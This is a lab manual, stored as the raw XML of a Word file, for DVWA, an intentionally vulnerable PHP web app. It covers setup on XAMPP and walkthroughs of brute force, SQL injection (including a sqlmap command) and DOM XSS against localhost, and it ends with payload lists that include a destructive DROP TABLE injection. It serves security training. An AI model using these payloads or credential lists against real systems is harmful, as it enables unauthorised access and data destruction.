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DVWA Lab Manual</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>1. Introduction to DVWA</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>DVWA (Damn Vulnerable Web Application) is a PHP/MySQL web application that is intentionally vulnerable.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>It is designed for security professionals and students to practice common web vulnerabilities.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>2. DVWA Setup on Windows 11</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>1. Download and install XAMPP from https://www.apachefriends.org/</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>2. Start Apache and MySQL via XAMPP Control Panel.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>3. Clone or download DVWA from https://github.com/digininja/DVWA</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>4. Extract it to C:\xampp\htdocs\DVWA</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>5. Copy config.inc.php.dist to config.inc.php inside the config folder.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>6. Edit config.inc.php and set db_user to 'root' and db_password to ''</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>7. Create a database named 'dvwa' using http://localhost/phpmyadmin</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>8. Open http://localhost/DVWA/setup.php and click "Create / Reset Database"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>9. Login with admin/password and set security level to Low.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>3. Brute Force Attack in DVWA</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>1. Go to Brute Force module in DVWA.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>2. Use manual payloads like:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>- admin : password</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>- admin : 123456</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>3. Use Burp Suite to automate:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>- Intercept login request</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>- Send to Intruder</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>- Use payload list on password field</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>- Observe valid response (based on length or status code)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>4. SQL Injection in DVWA</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>1. Go to SQL Injection module.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>2. Try payloads like:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>- 1' OR '1'='1' --</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>- ' OR 1=1 --</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>- ' UNION SELECT null, version() --</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>3. Use sqlmap (optional):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>sqlmap -u "http://localhost/DVWA/vulnerabilities/sqli/?id=1&amp;Submit=Submit" --cookie="security=low; PHPSESSID=..." --dbs</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>5. DOM-Based XSS in DVWA</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>1. Go to XSS (DOM) module.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>2. In the URL, inject:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>http://localhost/DVWA/vulnerabilities/xss_d/?default=&lt;script&gt;alert('DOM XSS')&lt;/script&gt;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>3. Observe popup.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>4. Try alternative payloads:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>- &lt;img src=x onerror=alert('XSS')&gt;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>- &lt;svg/onload=alert(1)&gt;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>6. Common Payload List (Appendix)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>XSS PAYLOADS:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>&lt;script&gt;alert('XSS')&lt;/script&gt;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>&lt;img src=x onerror=alert('XSS')&gt;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>&lt;svg/onload=alert('XSS')&gt;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>'"&gt;&lt;script&gt;alert('XSS')&lt;/script&gt;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>&lt;body onload=alert('XSS')&gt;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>&lt;iframe src='javascript:alert("XSS")'&gt;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>&lt;math&gt;&lt;mi//xlink:href='data:x,&lt;script&gt;alert(1)&lt;/script&gt;'&gt;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>javascript:alert('XSS')</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>BRUTE FORCE USERNAMES:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>admin</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>user</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>test</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>root</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>BRUTE FORCE PASSWORDS:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>admin</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>123456</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>password</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>1234</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>admin123</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>qwerty</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>letmein</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>SQL INJECTION PAYLOADS:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>1' OR '1'='1' --</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>' OR '1'='1' --</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>' OR 1=1 --</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>' OR 'a'='a' --</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>'; DROP TABLE users; --</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>' UNION SELECT null, version() --</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>1' AND 1=1 --</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>1' AND 1=2 --</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>' OR EXISTS(SELECT * FROM users)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